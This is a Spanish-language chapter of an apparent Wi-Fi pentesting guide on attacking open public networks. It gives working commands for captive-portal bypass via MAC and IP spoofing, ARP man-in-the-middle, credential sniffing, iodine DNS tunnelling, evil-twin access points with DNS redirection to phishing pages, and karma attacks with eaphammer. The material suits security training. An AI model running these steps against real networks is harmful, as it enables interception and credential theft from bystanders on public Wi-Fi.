# Capítulo 5.1: Ataques Wi-Fi - OPN (Redes Públicas Abiertas)

## Ataques a redes Wi-Fi OPN (Redes Públicas Abiertas)

Las Redes Públicas Abiertas (OPN) son aquellas redes Wi-Fi a las que cualquiera puede tener acceso sin una autenticación o contraseña previa. Aunque ofrecen comodidad, también son vulnerables a diversos ataques. A continuación, exploramos algunas técnicas utilizadas para explotar este tipo de redes.

### Bypass del Portal Cautivo

El portal cautivo es una página web con las que los usuarios deben interactuar, generalmente para aceptar términos de uso o ingresar una credencial, antes de obtener acceso completo a la red. Eludir este portal es una técnica común en ataques Wi-Fi OPN. A continuación, vamos a ver las principales formas de conseguir esto.

#### Autorización Basada en MAC (Suplantación de MAC)

La mayoría de los portales cautivos utilizan direcciones MAC para identificar los dispositivos y tener un listado de que usuarios han pasado el portal cautivo y cuáles no. Al clonar la dirección MAC de un dispositivo autorizado, es posible obtener acceso a la red suplantando al usuario legítimo de cara al AP. A continuación, se detalla esta técnica:

1\. Detener NetworkManager para evitar conflictos:

```
sudo systemctl stop NetworkManager
```

Detener NetworkManager interrumpirá cualquier conexión activa de Ethernet o Wi-Fi. Si está utilizando un cable, deberá solicitar una dirección IP con dhclient \<INTERFAZ> -v.

2\. Cambiar la dirección MAC usando una de estas opciones:

```
sudo ip link set dev <INTERFACE> address 
```

O:

```
ip link set wlan2 down
macchanger -m <CLIENTE_MAC> <INTERFAZ>
ip link set wlan2 up
```

Reemplace \<INTERFAZ> con su interfaz Wi-Fi (por ejemplo, wlan0, wlan1) y \<CLIENTE\_MAC> con la dirección MAC de un cliente ya autenticado en el portal cautivo. Estos comandos se tienen que ejecutar como root

Una vez hecho esto necesitamos simplemente conectarnos normalmente a la red con dicha interfaz para acceder ya sin portal cautivo. El proceso para conectarse a una red Wi-Fi OPN desde la terminal se ha visto en el apartado 04.

Creamos el fichero de configuración wifi-opn.conf:

```
network={
  ssid="SSID_NAME"
  key_mgmt=NONE
}
```

Y nos conectamos a la red con wpa\_supplicant.

```
sudo wpa_supplicant -i <INTERFAZ> -c wifi-opn.conf
```

Este ataque puede dar problemas si el usuario al que se suplanta la MAC sigue activo, ya que al haber conflicto de MAC con el cliente legitimo pueden perderse paquetes a nivel de red y tener problemas. Por eso la mejor opción es utilizar la MAC de un cliente con muy poco tráfico o que hemos visto en el pasado y ya no está activo.

#### Autorización Basada en IP (Suplantación de IP)

Si la autorización está vinculada a direcciones IP, los atacantes pueden suplantar la dirección IP de un dispositivo autenticado. A continuación, se describe este proceso de forma sencilla:

**1.Habilitar el reenvío de IP:** Este paso permite al dispositivo atacante reenviar los paquetes de red entre la víctima y otros dispositivos, actuando como un router.

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**2.Iniciar un ataque Man-in-the-Middle con ARP Spoofing usando** Etterca&#x70;**:** Ettercap es una herramienta que permite interceptar y manipular el tráfico de red mediante ARP spoofing.

```
ettercap -T -q -i wlan0 -w dump -M ARP /IP_cliente_autorizado/ /IP_gateway/
```

* -T: Utiliza la interfaz de texto (Text Mode).
* -q: Ejecuta en modo silencioso (quiet mode).
* -i wlan0: Especifica la interfaz de red (wlan0 en este caso; puede variar dependiendo del dispositivo).
* -w dump: Guarda los datos capturados en un archivo llamado dump.
* -M ARP: Especifica que se realizará un ataque de ARP spoofing.
* /IP\_cliente\_autorizado/: La dirección IP del cliente autenticado (víctima).
* /IP\_gateway/ La dirección IP del gateway (puerta de enlace).

3\. Suplantar la IP autenticada mediante iptables:

Una vez tenemos el MitM podemos utilizar iptables. iptables es una herramienta muy potente para la gestión de reglas del firewall en Linux, utilizada aquí para manipular el tráfico IP y suplantar la IP del cliente autorizado después del ataque con ettercap de MitM. Para ello creamos una regla de firewall en el equipo en el tráfico saliente hacia internet para que utilicen la IP de origen del usuario al que estamos suplantando.

```
iptables -t nat -A OUTPUT -d ! <LAN> -j SNAT --to <IP_cliente_autorizado>
```

* -t nat: Indica que la regla se aplica en la tabla de NAT (Network Address Translation).
* -A OUTPUT: Añade una regla a la cadena OUTPUT, que se aplica al tráfico saliente del dispositivo atacante.
* -d ! LAN: Aplica la regla a todos los destinos que no están en la red local ( ).
* -j SNAT --to \<IP\_cliente\_autorizado>: Realiza Source NAT (SNAT), cambiando la dirección de origen a la IP del cliente autorizado.

Incrementamos el TTL en uno para evitar detección.

```
iptables -t mangle -A FORWARD -d <IP_cliente_autorizado> -j TTL --ttl-inc 1
```

* -t mangle: Indica que la regla se aplica en la tabla de mangle, usada para ajustes en los paquetes.
* -A FORWARD: Añade una regla a la cadena FORWARD, que se aplica al tráfico que pasa a través del dispositivo atacante.
* -d \<IP\_cliente\_autorizado>: Especifica que la regla afecta al tráfico destinado a la IP del cliente autenticado.
* -j TTL --ttl-inc 1: Cambia el valor de Time-to-Live (TTL) de los paquetes, incrementándolo en 1, lo que ayuda a ofuscar el origen del tráfico para evitar detección.

Estos comandos permiten al atacante interceptar y modificar el tráfico de red, haciéndose pasar por un dispositivo autenticado y evitando ser detectado fácilmente.

#### Robo de credenciales

Si el portal cautivo no utiliza TLS, es decir, el envío de credenciales utiliza HTTP es posible obtener las credenciales en texto claro monitorizando el tráfico como se ha visto en el apartado de Recon. Esto se puede hacer con airodump-ng.

```
sudo airmon-ng start <INTERFAZ>
sudo airodump-ng <INTERFAZ MON> -w ~/wifi/scan --manufacturer --wps -c <CHANNEL>
```

Una vez tenemos la captura monitorizando suficiente tiempo podemos abrir el fichero .cap con wireshark filtrando por comunicaciones HTTP.

<figure><img src="../../../../.gitbook/assets/image (1185).png" alt=""><figcaption></figcaption></figure>

#### Bypass del portal cautivo con túnel DNS

El túnel DNS es una técnica que permite enviar datos arbitrarios a través del protocolo DNS (Domain Name System) a un servidor en remoto. DNS es un protocolo utilizado principalmente para la resolución de nombres de dominio en direcciones IP. Dado que las solicitudes DNS son generalmente permitidas incluso en redes con portales cautivos, este protocolo se puede utilizar para crear un canal de comunicación que pase desapercibido por las restricciones del portal.

Para esto necesitamos un servidor accesible desde internet y un dominio al que realizar consultas, por lo que es más complicado de montar, pero un dominio cuesta menos de 10€ al año hoy en día.

A continuación, podemos ver los pasos para configurarlo.

* **Configuración del Servidor y Cliente DNS:** Se instala y configura software como iodine en un servidor con acceso a Internet y en el dispositivo cliente.
* **Intercambio de Paquetes DNS:** El cliente envía solicitudes DNS al servidor, que extrae los datos y responde con información encapsulada en respuestas DNS.
* **Decapsulación y Transmisión:** El cliente recibe las respuestas DNS, decapsula los datos y establece comunicación bidireccional a través del túnel.

Esto se puede hacer con iodine muy fácilmente. El primer paso es configurar el DNS con la siguiente configuración.

```
t1 IN NS t1ns.mydomain.com. ; note the dot!
t1ns IN A 10.15.213.99
```

En este caso vamos a utilizar iodine, pero se podría utilizar DNS2tcp y otros programas similares. Una vez tenemos el dominio configurado podemos simplemente ejecutar iodine en el servidor especificando el dominio a utilizar.

```
iodined -f -c -P secretpassword 192.168.99.1 t1.mydomain.com
```

Desde el cliente se ejecuta iodine también para montar el túnel.

```
iodine -f -P secretpassword t1.mydomain.com
```

Con el túnel configurado el proceso habitual es montar un túnel SSH dinámico a la IP dentro del túnel de servidor en remoto para salir a internet desde ahí. En este caso sería contra la IP 192.168.99.1.

Para más información de la configuración y uso: [https://github.com/yarrick/iodine](https://github.com/yarrick/iodine)

#### Inicio de Sesión en el Portal Cautivo (Pruebas Web)

También se puede revisar la funcionalidad del portal cautivo como una aplicación web, esto puede revelar vulnerabilidades explotables, tales como:

* **Ataques de Fuerza Bruta**: Intentar múltiples combinaciones de usuario y contraseña para encontrar una válida.
* **Inyección SQL**: Explorar el portal buscando inyecciones SQL que puedan alterar la base de datos subyacente.
* **Referencias Directas a Objetos Inseguras (**&#x49;DO&#x52;**)**: Manipular URLs para acceder a recursos sin autorización.
* **Explotación de CVEs (Vulnerabilidades Conocidas)**: Utilizar exploits de vulnerabilidades conocidas y disponibles públicamente.

### Punto de Acceso Falso (Evil twin)

Un Punto de Acceso (AP) Falso puede ser creado para imitar la red Wi-Fi legítima, incluyendo su portal cautivo, con el fin de engañar a los usuarios. Herramientas como hostapd y dnsmasq pueden ser utilizadas para este propósito. A continuación, se muestra un ejemplo básico de configuración de un punto de acceso para monitorizar el tráfico de los clientes de la red:

1\. Crear el archivo de configuración para hostapd:

```
interface=wlan0
ssid=FakeOpenNetwork
channel=6
```

2\. Configurar el servidor DHCP con dnsmasq modificando el fichero /etc/dnsmasq.conf con la siguiente información. :

```
interface=wlan0
dhcp-range=192.168.1.50,192.168.1.150,12h
```

> Estos archivos son configuraciones básicas para crear un AP falso. Se puede añadir un portal cautivo personalizado para recopilar credenciales o redirigir tráfico a sitios maliciosos. El rango de red puede ser cualquiera privado.

Una vez los clientes están conectados al Evil Twin, es posible envenenar las consultas DNS con dnsmasq para redirigir a los clientes a webs fraudulentas o con phishing. Es esencialmente una forma de ataque Man-in-the-Middle.

3\. Configurar dnsmasq para redirección de DNS hacia un servidor controlado por nosotros:

```
address=/example.com/192.168.1.100
```

> Este comando redirige todas las solicitudes a example.com a la IP 192.168.1.100, que puede ser un sitio de phishing.

### Visualización del Tráfico de Usuarios Sin Cifrar

Las redes OPN no cifran el tráfico entre el dispositivo del usuario y el punto de acceso. Esto permite a los atacantes espiar el tráfico de la red para capturar datos no cifrados, como nombres de usuario, contraseñas y actividad de navegación. Herramientas como Wireshark o tcpdump pueden ser utilizadas para capturar y analizar este tráfico:

* Capturar tráfico en una interfaz específica:

```
tcpdump -i wlan0 -w capture.pcap
```

* Analizar el archivo capturado con Wireshark:

```
wireshark capture.pcap
```

También se puede hacer como se ha visto en la parte de reconocimiento con airodump-ng

### Karma Attack

Karma Attack aprovecha el hecho de que la mayoría de clientes Wi-Fi buscan activamente redes a las que se han conectado antes. Cuando un dispositivo cliente envía Probe Requests consultando SSIDs en su Preferred Network List, un punto de acceso malicioso puede responder con cualquier SSID solicitado, incluso si esa red no está realmente cerca. El cliente entonces se asociará, creyendo que se está conectando a una red de confianza, lo que otorga al atacante una posición ideal para interceptar el tráfico y realizar ataques de man-in-the-middle.

Esta técnica solo funciona contra redes abiertas (OPN); en el caso de PSK podemos hacer lo mismo, pero solo obtendremos medio handshake.

#### Cómo Funciona

* **Solicitudes de Probe Requests del cliente:** Los dispositivos emiten periódicamente los nombres (SSIDs) de redes Wi-Fi a las que se han conectado antes.
* **Respuesta del AP malicioso:** La herramienta del atacante escucha estas sondas y responde de inmediato, suplantando el SSID solicitado.
* **Asociación automática:** El cliente se asocia automáticamente al punto de acceso malicioso.
* **Captura e inyección de tráfico:** Una vez asociado, todo el tráfico del cliente pasa por el AP del atacante. Este puede realizar packet sniffing y manipulación (por ejemplo, HTTPS stripping, DNS spoofing).

#### Ejemplo con eaphammer

Podemos usar eaphammer para lanzar este ataque:

```
cd ~/tools/eaphammer/
./eaphammer -i wlan0 --essid karma --cloaking full -c 1 --auth open --karma
```

<figure><img src="../../../../.gitbook/assets/image (1186).png" alt=""><figcaption></figcaption></figure>

En este ejemplo, el cliente objetivo está actualmente conectado a wifi-global pero tiene otras dos redes en su PNL que parecen estar abiertas: open-wifi y WiFi-Restaurant.

<figure><img src="../../../../.gitbook/assets/image (1187).png" alt=""><figcaption></figcaption></figure>

Luego desautenticamos al cliente para forzarlo a desconectarse de wifi-global:

<figure><img src="../../../../.gitbook/assets/image (1188).png" alt=""><figcaption></figcaption></figure>

Inmediatamente después, el cliente se conecta al falso AP:

<figure><img src="../../../../.gitbook/assets/image (1189).png" alt=""><figcaption></figcaption></figure>

En la siguiente imagen, vemos el falso AP emitiendo el WiFi-Restaurant SSID

<figure><img src="../../../../.gitbook/assets/image (1190).png" alt=""><figcaption></figcaption></figure>

También podemos ver que eaphammer intenta recrear todos los ESSIDs encontrados en las solicitudes de sondeo del cliente:

<figure><img src="../../../../.gitbook/assets/image (1191).png" alt=""><figcaption></figcaption></figure>

> También puedes usar las opciones "--hostile-portal" o "--captive-portal" para mostrar una página de inicio de sesión falsa y atacar activamente al cliente, en lugar de solo monitorear el tráfico.
